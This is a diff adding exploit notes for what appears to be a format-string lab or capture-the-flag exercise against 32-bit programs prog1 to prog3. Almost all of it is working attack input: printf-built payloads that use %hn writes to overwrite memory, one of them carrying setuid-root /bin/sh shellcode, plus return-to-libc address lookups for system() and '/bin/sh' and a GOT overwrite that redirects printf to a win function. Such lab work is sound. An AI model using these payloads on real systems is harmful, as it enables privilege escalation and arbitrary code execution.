@@ -1,0 +1,28 @@
+echo $(printf "\x46\xf0\xff\xbf@@@@\x44\xf0\xff\xbf")%.8x%.8x%.8x%.8x%.26204x%hn%.4369x%hn > input
+
+echo $(printf "\x46\xf0\xff\xbf@@@@\x44\xf0\xff\xbf")%.8x%.8x%.8x%.8x%.56961x%hn%.57410x%hn > input
+
+./prog1 < input | grep -a address
+
+echo $(printf "\xde\xef\xff\xbf@@@@\xdc\xef\xff\xbf")%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%49019x%hn%12369x%hn$(printf "\x31\xc0\x31\xdb\xb0\xd5\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00") > input
+
+0xbfffeff4  BFFFF050
+
+gcc -fstack-protector -z noexecstack -o prog21 prog2.c
+
+ldd prog3
+readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
+strings -tx /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh
+info proc mappings
+
+基地址：0xb7e08000
+ebp:0xbfffefc8
+system():0003adb0  B7E4 2DB0
+/bin/sh:0015bb2b  B7F6 3B2B
+
+echo $(printf "\xcc\xef\xff\xbf@@@@\xd4\xef\xff\xbf@@@@\xce\xef\xff\xbf@@@@\xd6\xef\xff\xbf")%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%11548x%hn%3451x%hn%31929x%hn%18x%hn > input
+
+printf plt: 0x08 04 a0 0c
+win: 0x0804 850b
+
+echo $(printf "\x0e\xa0\x04\x08@@@@\x0c\xa0\x04\x08")%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%1920x%hn%32007x%hn > input
